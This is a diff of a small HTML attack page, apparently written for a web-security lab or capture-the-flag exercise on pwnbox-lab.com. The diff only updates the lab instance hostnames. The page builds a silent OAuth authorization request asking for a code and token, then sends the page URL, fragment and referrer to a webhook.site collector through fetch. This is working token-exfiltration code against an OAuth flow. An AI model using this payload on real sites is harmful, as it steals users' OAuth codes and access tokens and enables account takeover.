@@ -4,8 +4,8 @@
 <title>p4b</title>
 <script>
 const C='https://webhook.site/d6b0bb65-c7e6-43ad-9762-1804b0bb7e41';
-const APP='https://solo-leveling-referer-0a11a8c95369.pwnbox-lab.com';
-const IDP='https://google-0a11a8c95369.pwnbox-lab.com/o/oauth2/v2/auth?client_id=solo-leveling-4-client&redirect_uri='+encodeURIComponent(APP+'/callback')+'&response_type=code%20token&scope=openid%20email%20profile&state=frag'+Date.now()+'&prompt=none';
+const APP='https://solo-leveling-referer-3cadf15ca03c.pwnbox-lab.com';
+const IDP='https://google-3cadf15ca03c.pwnbox-lab.com/o/oauth2/v2/auth?client_id=solo-leveling-4-client&redirect_uri='+encodeURIComponent(APP+'/callback')+'&response_type=code%20token&scope=openid%20email%20profile&state=frag'+Date.now()+'&prompt=none';
 const run='p4b_'+Date.now();
 function send(k,v){ try{ fetch(C+'/?probe4b='+encodeURIComponent(k)+'&run='+encodeURIComponent(run)+'&v='+encodeURIComponent(v||''),{mode:'no-cors'}); }catch(e){} }
 send('load','href='+location.href+'|hash='+location.hash+'|ref='+document.referrer);
